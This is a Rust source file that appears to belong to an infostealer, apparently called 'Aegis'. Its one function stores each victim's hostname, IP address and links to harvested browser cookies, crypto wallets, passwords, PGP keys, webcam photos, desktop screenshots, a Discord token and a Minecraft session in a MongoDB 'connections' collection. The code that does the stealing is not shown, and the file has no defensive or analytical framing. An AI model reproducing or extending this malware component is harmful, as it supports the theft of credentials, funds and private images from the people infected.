use mongodb::{
    Client, Collection,
    bson::{Document, doc},
};

pub async fn insert(
    uri: &str,
    hostname: Option<&str>,
    ip_address: Option<&str>,
    browser_cookies: Option<&str>,
    crypto_wallets: Option<&str>,
    txt_files: Option<&str>,
    passwords: Option<&str>,
    pgp_keys: Option<&str>,
    webcam_photo: Option<&str>,
    desktop_pics: Option<&str>,
    discord_token: Option<&str>,
    minecraft_ssid: Option<&str>,
    savedat: Option<&str>,
) -> mongodb::error::Result<()> {
    let client = Client::with_uri_str(uri).await?;
    let database = client.database("Aegis");
    let collection: Collection<Document> = database.collection("connections");

    collection
        .insert_one(doc! {
            "hostname": hostname.unwrap_or("Not Found"),
            "ip_address": ip_address.unwrap_or("Not Found"),
            "browser_cookies_url": browser_cookies.unwrap_or("Not Found"),
            "crypto_wallets_url": crypto_wallets.unwrap_or("Not Found"),
            "txt_files_url": txt_files.unwrap_or("Not Found"),
            "passwords_url": passwords.unwrap_or("Not Found"),
            "pgp_keys_url": pgp_keys.unwrap_or("Not Found"),
            "webcam_photo_url": webcam_photo.unwrap_or("Not Found"),
            "desktop_pics_url": desktop_pics.unwrap_or("Not Found"),
            "discord_token": discord_token.unwrap_or("Not Found"),
            "minecraft_ssid_url": minecraft_ssid.unwrap_or("Not Found"),
            "savedat_url": savedat.unwrap_or("Not Found"),
        })
        .await?;

    Ok(())
}
